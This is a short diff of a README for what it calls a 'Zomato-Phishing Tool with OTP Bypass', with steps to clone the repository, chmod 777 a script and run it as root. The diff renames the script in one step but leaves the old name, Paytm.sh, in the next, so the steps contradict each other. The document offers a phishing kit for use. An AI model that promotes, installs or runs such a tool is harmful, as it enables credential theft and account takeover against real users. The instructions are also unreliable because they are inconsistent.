@@ -14,7 +14,7 @@ This is a Zomato-Phishing Tool with OTP Bypass ! Zomato
 root ---must !
 1. git clone https://github.com/Ignitetch/Zomato-Phishing.git
 2. cd Zomato-Phishing
-3. chmod 777 Paytm.sh
+3. chmod 777 Zomato.sh
 4. ./Paytm.sh
 
 # Contact For Contribute
